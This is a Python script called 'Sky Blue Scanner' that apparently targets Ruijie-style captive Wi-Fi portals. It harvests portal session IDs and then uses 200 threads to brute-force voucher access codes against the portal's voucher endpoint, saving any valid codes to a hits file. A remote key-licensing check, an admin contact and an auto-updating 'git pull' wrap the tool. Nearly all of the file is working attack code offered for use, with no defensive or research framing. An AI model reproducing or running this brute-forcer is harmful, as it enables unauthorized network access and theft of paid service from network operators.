import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RENDER_URL = "https://ytun-keybot.onrender.com" 

KEY_URL = f"{RENDER_URL}/api/keys"
STATUS_URL = f"{RENDER_URL}/api/status"
LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")

SAVE_PATH = "/storage/emulated/0/zapya/hits.txt"
STATS_FILE = "/storage/emulated/0/zapya/total_stats.txt"

B_CYAN = "\033[1;36m"; RESET = "\033[0m"; B_GREEN = "\033[1;32m"
B_RED = "\033[1;31m"; YELLOW = "\033[1;33m"; CYAN = "\033[0;36m"
WHITE = "\033[1;37m"

NUM_THREADS = 200             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 300         
CODE_LENGTH = 6 
CHAR_SET = string.digits 

session_pool = Queue()
valid_codes = [] 
tried_codes = set()
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()

if os.path.exists(STATS_FILE):
    try:
        with open(STATS_FILE, "r") as f:
            TOTAL_TRIED = int(f.read().strip())
    except: TOTAL_TRIED = 0
else: TOTAL_TRIED = 0

def get_system_key():
    try: uid = os.getuid() if hasattr(os, 'getuid') else 1000
    except: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def check_status():
    try:
        res = requests.get(f"{STATUS_URL}?t={time.time()}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            if data.get("script", {}).get("status") != "ON":
                print(f"\n{B_RED}[❌] SCRIPT IS CURRENTLY OFFLINE / DISABLED{RESET}")
                return False
        return True
    except:
        return True

def fetch_authorized_keys():
    keys = []
    expirations = {}
    try:
        response = requests.get(f"{KEY_URL}?t={time.time()}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            keys = data.get("keys", [])
            expirations = data.get("expirations", {})
            
            save_data = []
            for k in keys:
                exp = expirations.get(k, 0)
                save_data.append(f"{k}|{exp}")
                
            with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(save_data))
            return keys, expirations
    except:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                for line in f:
                    parts = line.strip().split('|')
                    if len(parts) == 2:
                        keys.append(parts[0])
                        expirations[parts[0]] = float(parts[1])
                    elif len(parts) == 1 and parts[0]: 
                        keys.append(parts[0])
                        expirations[parts[0]] = 0
            return keys, expirations
    return keys, expirations

def check_approval():
    os.system('clear')
    print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{B_CYAN}            SKY BLUE SCANNER - PROTECTED          {RESET}")
    print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    
    if not check_status():
        return False
        
    my_key = get_system_key()
    approved_keys, expirations = fetch_authorized_keys()
    
    if my_key in approved_keys:
        exp_time = expirations.get(my_key, 0)
        if exp_time > 0 and time.time() > exp_time:
            print(f"\n{B_RED}[❌] ACCESS DENIED: သင်၏ Key သက်တမ်းကုန်သွားပါပြီ။{RESET}")
            print(f"Contact Admin: @Kenobe21")
            return False
            
        print(f"\n{B_GREEN}[✓] ACCESS GRANTED!{RESET}")
        return True
    else:
        print(f"\n{B_RED}[❌] ACCESS DENIED{RESET}")
        print(f"Contact Admin: @Kenobe21")
        print(f"Your Key: {B_CYAN}{my_key}{RESET}")
        return False

def continuous_auth_check():
    while True:
        time.sleep(60) 
        if not check_status():
            os._exit(0) 
            
        my_key = get_system_key()
        approved_keys, expirations = fetch_authorized_keys()
        
        if my_key not in approved_keys:
            print(f"\n\n{B_RED}[❌] ACCESS REVOKED! သင်၏ Key ပယ်ဖျက်ခံလိုက်ရပါသည်။{RESET}\n")
            os._exit(0) 
            
        exp_time = expirations.get(my_key, 0)
        if exp_time > 0 and time.time() > exp_time:
            print(f"\n\n{B_RED}[❌] ACCESS EXPIRED! သင်၏ Key သက်တမ်းကုန်သွားပါပြီ။{RESET}\n")
            os._exit(0)

def print_banner():
    print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{B_CYAN}         S K Y   B L U E   S C A N N E R  -  V 7 . 5          {RESET}")
    print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

def select_mode_and_run():
    global CODE_LENGTH, CHAR_SET, stop_event
    
    while True:
        os.system('clear')
        print_banner()
        print(f"\n {B_CYAN}[ SELECT SCAN MODE ]{RESET}")
        print(f" {B_CYAN}┏[{YELLOW}1{B_CYAN}]━ {WHITE}Scan 6-Digit (000000)")
        print(f" {B_CYAN}┏[{YELLOW}2{B_CYAN}]━ {WHITE}Scan 7-Digit (0000000)")
        print(f" {B_CYAN}┏[{YELLOW}3{B_CYAN}]━ {WHITE}Scan 8-Digit (00000000)")
        print(f" {B_CYAN}┏[{YELLOW}4{B_CYAN}]━ {WHITE}Scan 9-Digit (000000000)")
        print(f" {B_CYAN}┏[{YELLOW}5{B_CYAN}]━ {WHITE}Alphanumeric Mode (a-z, 0-9)")
        print(f" {B_CYAN}┏[{YELLOW}6{B_CYAN}]━ {WHITE}Custom Code (ifhuef format)")
        print(f" {B_CYAN}┏[{B_RED}7{B_CYAN}]━ {WHITE}EXIT SCANNER")
        
        choice = input(f"\n{B_CYAN}Choose (1-7): {RESET}")
        
        if choice == "7":
            sys.exit()
        
        if choice == "2": 
            CODE_LENGTH = 7; CHAR_SET = string.digits
        elif choice == "3": 
            CODE_LENGTH = 8; CHAR_SET = string.digits
        elif choice == "4": 
            CODE_LENGTH = 9; CHAR_SET = string.digits
        elif choice == "5" or choice == "6":
            CODE_LENGTH = 6; CHAR_SET = string.ascii_lowercase + string.digits 
        else: 
            CODE_LENGTH = 6; CHAR_SET = string.digits
        
        print(f"{B_GREEN}[!] Initializing Turbo Engine...{RESET}")
        time.sleep(1)
        
        stop_event.clear()
        run_scanner_core()

def save_progress():
    try:
        os.makedirs(os.path.dirname(STATS_FILE), exist_ok=True)
        with file_lock:
            with open(STATS_FILE, "w") as f: f.write(str(TOTAL_TRIED))
    except: pass

def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    try:
        r1 = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=5)
            final_url = r2.url
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.5)
        except: time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            sid = slot.get('sessionId')
            
            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
            if code in tried_codes: continue
            tried_codes.add(code)
            CURRENT_CODE = code
            
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, timeout=6)
            TOTAL_TRIED += 1
            if TOTAL_TRIED % 100 == 0: save_progress()
            
            if "true" in r.text.lower():
                with valid_lock:
                    if code not in valid_codes:
                        valid_codes.append(code)
                        TOTAL_HITS += 1
                        save_locally(code, sid)
            
            if r.status_code not in (401, 403):
                slot['left'] -= 1
                if slot['left'] > 0: session_pool.put(slot)
        except: pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: f.write(f"{ts} | {code} | SID: {sid}\n")
    except: pass

def live_dashboard():
    while not stop_event.is_set():
        os.system('clear')
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        print_banner()
        print(f" [TOTAL TRIED] : {TOTAL_TRIED:,}")
        print(f" [FOUND HITS]  : {B_GREEN}{TOTAL_HITS}{RESET}")
        print(f" [LIVE SPEED]  : {speed:.1f} codes/sec")
        print(f" [LAST CODE]   : {YELLOW}{CURRENT_CODE}{RESET}") 
        print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        print(f" [MODE]        : {CYAN}{'Alphanumeric' if len(CHAR_SET)>10 else 'Digital ' + str(CODE_LENGTH) + 'L'}{RESET}")
        print(" [RECENT HITS]:")
        for c in valid_codes[-5:]: print(f"  > ✅ {c}")
        print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        print(f" {B_RED}(CTRL+C TO BACK TO MENU){RESET}")
        time.sleep(1.0)

def run_scanner_core():
    try:
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        
        while not stop_event.is_set():
            time.sleep(1)
            
    except KeyboardInterrupt:
        stop_event.set()
        save_progress()
        print(f"\n\n{B_RED}[!] Session Stopped. Returning to Menu...{RESET}")
        time.sleep(1.5)

if __name__ == '__main__':
    os.system('git pull --quiet')
    if check_approval():
        threading.Thread(target=continuous_auth_check, daemon=True).start()
        try:
            __import__('core')
        except ImportError:
            select_mode_and_run()
    else:
        sys.exit()